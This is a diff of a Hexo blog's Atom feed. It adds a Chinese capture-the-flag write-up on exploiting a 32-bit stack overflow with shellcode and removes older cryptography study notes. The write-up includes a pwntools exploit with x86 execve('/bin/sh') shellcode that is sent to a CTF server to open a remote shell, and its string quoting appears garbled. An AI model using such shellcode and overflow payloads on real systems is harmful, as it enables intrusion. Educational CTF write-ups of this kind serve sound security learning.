@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://muzibing.github.io/"/>
-  <updated>2019-10-14T05:04:37.070Z</updated>
+  <updated>2019-10-16T13:41:16.839Z</updated>
   <id>https://muzibing.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PWN 实战 - shellcode 题解</title>
+    <link href="https://muzibing.github.io/2019/10/16/2019.10.16%EF%BC%8886%EF%BC%89/"/>
+    <id>https://muzibing.github.io/2019/10/16/2019.10.16（86）/</id>
+    <published>2019-10-16T10:08:59.793Z</published>
+    <updated>2019-10-16T13:41:16.839Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a><font color="brown">一、基础知识</font></h3><h4 id="1-shellcode"><a href="#1-shellcode" class="headerlink" title="1.shellcode"></a><font color="navy">1.shellcode</font></h4><blockquote><p>有关 shellcode 的知识介绍，在这里我就不过多的介绍了，给大家附上几个我认为写的比较好的博文：</p><blockquote><ul><li><a href="https://www.zhihu.com/question/30943194" target="_blank" rel="noopener">shellcode原理是啥？</a></li><li><a href="https://yq.aliyun.com/articles/58699" target="_blank" rel="noopener"> 一步一步学ROP之linux_x86篇 </a></li><li><a href="https://blog.csdn.net/qq_35495684/article/details/79583232?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">PWN-shellcode获取与编写</a></li><li><a href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/" target="_blank" rel="noopener">渗透中PoC、Exp、Payload与Shellcode的区别</a></li></ul></blockquote></blockquote><h3 id="二、解题步骤"><a href="#二、解题步骤" class="headerlink" title="二、解题步骤"></a><font color="brown">二、解题步骤</font></h3><h4 id="1-查看文件类型"><a href="#1-查看文件类型" class="headerlink" title="1,查看文件类型"></a><font color="navy">1,查看文件类型</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file pwn3</span><br></pre></td></tr></table></figure><p><img src="/images/85-9.jpg" alt></p><blockquote><p>从上面的结果可以得出，该文件是一个 <code>32</code> 位的 ELF 文件</p></blockquote><h4 id="2-查看-pwn3-开启的保护"><a href="#2-查看-pwn3-开启的保护" class="headerlink" title="2.查看 pwn3 开启的保护"></a><font color="navy">2.查看 pwn3 开启的保护</font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn3</span><br></pre></td></tr></table></figure><p><img src="/images/85-10.jpg" alt></p><blockquote><p>从上图可以得出，pwn3 没有开启<code>栈保护</code>功能，没有开启<code>ASLR</code>，开启了<code>栈上数据可执行</code>，开启了<code>RELRO</code>，意味着我们可以对 GOT 进行写的权限。</p></blockquote><h4 id="3-寻找漏洞"><a href="#3-寻找漏洞" class="headerlink" title="3.寻找漏洞"></a><font color="navy">3.寻找漏洞</font></h4><blockquote><p>我们用 <code>IDA-32</code> 打开 <code>pwn3</code> ，通过对程序的观察我们发现在函数 <code>sub_804851A()</code> 中可能产生溢出漏洞：</p><p><img src="/images/85-11.jpg" alt></p><p>从上图可以看到：</p><ul><li>在栈中给 buf 的实际大小为：ebp - 0x1Ch（十进制：28）</li><li>用户实际能输入的数据大小为：0x100h（十进制：256）</li></ul><p>所以在这里会产生栈溢出，我们也就可以利用该漏洞获取 <code>flag</code></p></blockquote><h4 id="4-利用漏洞"><a href="#4-利用漏洞" class="headerlink" title="4.利用漏洞"></a><font color="navy">4.利用漏洞</font></h4><blockquote><p>在这道题中，因为大多数保护都没有开启，所以我们可以有多种构思思路：</p><ul><li>通过 libc 库来泄露 <code>system()</code> 的地址，这和 <code>ROP</code> 那道题的思路差不多</li><li>在缓冲区中填写我们构造的 <code>shellcode</code>，再通过返回 <code>shellcode</code> 的地址，来执行 <code>shellcode</code> ，获取系统调用权</li></ul><p>这里我们主要以第二种思路来讲解</p></blockquote><h4 id="5-分析思路"><a href="#5-分析思路" class="headerlink" title="5.分析思路"></a><font color="navy">5.分析思路</font></h4><blockquote><p>首先我们先来看一下这个栈中的情况：</p><p><img src="/images/85-1.jpg" alt></p><p>通过上面的情况，我们可以知道：</p><ul><li>填充的数据为：0x1c + 0x4 = 32</li><li>在返回地址这里，我们有多种返回方式：<ul><li>我们可以直接返回 <code>buf</code> 的首地址</li><li>我们也可以将地址返回到高地址中的参数，然后通过控制esp，再执行 `shellcode``</li><li>……</li></ul></li></ul><p>通过上面的分析，我们可以大概知道自己的 <code>payload</code> 了：</p><font color="red"><center>payload = shellcode + 'a' * 32 - len(shellcode) + p32(jmp_exp) + jmp_shellcode</center></font><p>具体的执行如下：</p><p><img src="/images/85-1.gif" alt></p></blockquote><h4 id="6-编写-exp"><a href="#6-编写-exp" class="headerlink" title="6.编写 exp"></a><font color="navy">6.编写 exp</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9992</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">"\x31\xc0\x31\xd2\x52\x68\x2f\x2f'</span></span><br><span class="line"><span class="string">shellcode += '\x73\x68\x68\x2f\x62\x69\x6e\x89</span></span><br><span class="line"><span class="string">shellcode += '\xe3\x31\xc9\xb0\x0b\xcd\x80'</span></span><br><span class="line"><span class="string">shellcode_jmp = asm('sub esp,0x24;jmp esp')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = shellcode + (32-len(shellcode))*'a' + p32(0x08048667) + shellcode_jmp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.send(payload)</span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure><h4 id="7-获取-flag"><a href="#7-获取-flag" class="headerlink" title="7.获取 flag"></a><font color="navy">7.获取 flag</font></h4><p><img src="/images/85-12.jpg" alt></p><h3 id="三、相关问题"><a href="#三、相关问题" class="headerlink" title="三、相关问题"></a><font color="brown">三、相关问题</font></h3><blockquote><ol><li>返回到 buf 的起始地址后，为什么能够执行 shellcode？</li><li>sendline() 和 send() 的区别是什么？</li></ol></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;一、基础知识&quot;&gt;&lt;a href=&quot;#一、基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、基础知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-shellcode&quot;&gt;&lt;a href=&quot;
+      
+    
+    </summary>
+    
+    
+      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
+    
+      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>变色龙哈希（Chameleon Hash）、零知识证明（Zero—Knowledge Proof）和广播加密相关知识</title>
@@ -503,35 +528,6 @@
         &lt;blockquote&gt;
 &lt;p&gt;&lt;font color=&quot;brown&quot;&gt;&lt;strong&gt;☛  前言：&lt;/strong&gt;&lt;/font&gt;&lt;br&gt;
         今天终于把论文的终稿弄完了，也可以好好的静下来继续测试和学习知识了，以后要抓紧时间，把以前没有完成的内容赶紧补回来，赶上大
-      
-    
-    </summary>
-    
-    
-      <category term="Crypto" scheme="https://muzibing.github.io/tags/Crypto/"/>
-    
-      <category term="《图解密码技术》学习笔记" scheme="https://muzibing.github.io/tags/%E3%80%8A%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>《图解密码技术》第十五章（密码技术和现实生活）学习笔记</title>
-    <link href="https://muzibing.github.io/2019/06/03/2019.06.03%EF%BC%8866%EF%BC%89/"/>
-    <id>https://muzibing.github.io/2019/06/03/2019.06.03（66）/</id>
-    <published>2019-06-02T16:00:00.000Z</published>
-    <updated>2019-06-03T15:08:22.515Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p><strong>☛  学习的内容：</strong><br>本章学习的内容主要是对前14章所学的总结，今天就好好的总结一下吧。</p></blockquote><h4 id="font-colorbrown1密码学家的工具箱font"><a class="markdownIt-Anchor" href="#font-colorbrown1密码学家的工具箱font"></a> <font color="brown">1.密码学家的工具箱</font></h4><blockquote><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/g7.unUm.nPEOBNU*FsISv8NMQ5vuPyGc1pwVSWuTkXw!/r/dL8AAAAAAAAA" alt><br><br>      <font color="navy"><strong>▣ 对称密码</strong>：</font><br>                ◈ 主要是为了确保消息的机密性。<br>                ◈ 目前主要使用的是 AES ，它的算法为<strong>Rrijndael</strong>算法；<br>                ◈ 除了 AES 还有<strong>DES</strong>、<strong>三重 DES</strong>，它们是差分分析和线性分析。<br><br>      <font color="navy"><strong>▣ 公钥密码</strong>：</font><br>                ◈ 是一种不同的密钥进行加密和解密的技术，也是用于确保消息的机密性（<strong>主要是密钥分配问题</strong>）。<br>                ◈ 使用最为广泛的一种公钥密码算法是 <strong>RSA</strong>，除此之外还有 <strong>ELGamal</strong> 和 <strong>Rabin</strong> 等算法，以及与其相关 <strong>Diffie-Hellman</strong> 密钥交换（DH）和椭圆曲线 Diffie-Hellman 密钥交换（ECDH）等技术。<br>                ◈ <font color="blue">公钥密码和对称密码一般都组成混合密码系统来使用的。</font><br><br>      <font color="navy"><strong>▣ 单向散列函数</strong>：<br>                ◈ </font>是一种将长消息转换为短散列值的技术，用于<strong>确保消息的完整性</strong>。<br>                ◈ 包括的算法有<strong>SHA-1、SHA-2（SHA-256、SHA-384和SHA-512）和 SHA-3</strong>，除了SHA系列算法，还有<strong>MD4、MD5</strong>和 <strong>ROIPED-160</strong> 算法。<br>                ◈ 单向散列函数可以<font color="navy">单独使用，也可以作为<strong>消息认证码</strong>、<strong>数字签名</strong>以及<strong>伪随机数生成器</strong>等技术的组成元素来使用</font><br><br>      <font color="navy"><strong>▣ 消息认证码</strong>：</font><br>                ◈ 是一种能识别通信对象发送的消息是否被篡改的认证技术，<strong>用于验证消息的完整性，以及对消息进行认证</strong>。<br>                ◈ 该技术是<strong>利用了单向散列函数的HMAC</strong>，但是<strong>无法对第三方进行认证，也无法防止否认</strong>。<br><br>      <font color="navy"><strong>▣ 数字签名</strong>：</font><br>                ◈ 是一种能够对第三方进行消息认证，并能够防止通信对象做出否认的技术。<br>                ◈ 数字签名的算法有<strong>RSA、ElGamal、DSA、椭圆曲线 DSA（ECDSA）、爱德华兹曲线DSA（EDDSA）<strong>等。<br><br>      <font color="navy"><strong>▣ 伪随机数生成器</strong>：</font><br>                ◈ 是一种能够生成具备不可预测性的比特序列的技术；<br>                ◈ 由</strong>密码</strong>和<strong>单向散列函数</strong>构成的；<br>                ◈ 伪随机数生成器用于生成密钥、初始化向量和 nonce 等</p></blockquote><h4 id="brfont-colorbrown2密码与认证font"><a class="markdownIt-Anchor" href="#brfont-colorbrown2密码与认证font"></a> <br><font color="brown"><strong>2.密码与认证</strong></font></h4><blockquote><p>      对于认证最关键的就是<strong>确保公钥的真实性和合法性</strong></p></blockquote><h4 id="brfont-colorbrown3密码技术的框架font"><a class="markdownIt-Anchor" href="#brfont-colorbrown3密码技术的框架font"></a> <br><font color="brown"><strong>3.密码技术的框架</strong></font></h4><blockquote><p>      正如上面所涉及到技术问题，SSL/TSL 提供了一种密码通信的框架，这就意味着<strong>SSL/TSL 中使用的对称密码、公钥密码、数字签名、单向散列函数等技术，都<font color="red">会像零件一样进行替换</font></strong>。但也必须要确保整体的兼容性，所以有推荐的套餐，而这种套餐也被称为”密码套件“。</p></blockquote><h4 id="brfont-colorbrown4密码技术和压缩技术font"><a class="markdownIt-Anchor" href="#brfont-colorbrown4密码技术和压缩技术font"></a> <br><font color="brown"><strong>4.密码技术和压缩技术</strong></font></h4><blockquote><p>      <strong>▣ 对称密码和公钥密码</strong>：<font color="red">机密性的压缩</font><br>      <strong>▣ 单向散列函数</strong>：<font color="red">完整性的压缩</font><br>      <strong>▣ 消息认证码和数字签名</strong>：<font color="red">认证的压缩</font><br>      <strong>▣ 伪随机数生成器</strong>：<font color="red">不可预测性的压缩</font><br><br>我们从另外一个角度来总结一下：<br><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/7AcsOpuwdpenNNVOK243hYGgL6tL*.t*i8BvCFOSbj4!/r/dLYAAAAAAAAA" alt><br>      <strong>▣ <font color="red">密钥</font>是机密性的精华</strong><br>      <strong>▣ <font color="red">散列值</font>是完整性的精华</strong><br>      <strong>▣ <font color="red">认证符号（MAC 值和签名）</font>是认证的精华</strong><br>      <strong>▣ <font color="red">种子</font>是不可预测性的精华</strong></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;☛  学习的内容：&lt;/strong&gt;&lt;br&gt;
-本章学习的内容主要是对前14章所学的总结，今天就好好的总结一下吧。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id=&quot;font-colorbrown1密码学家的工具箱font&quot;&gt;&lt;a 
       
     
     </summary>
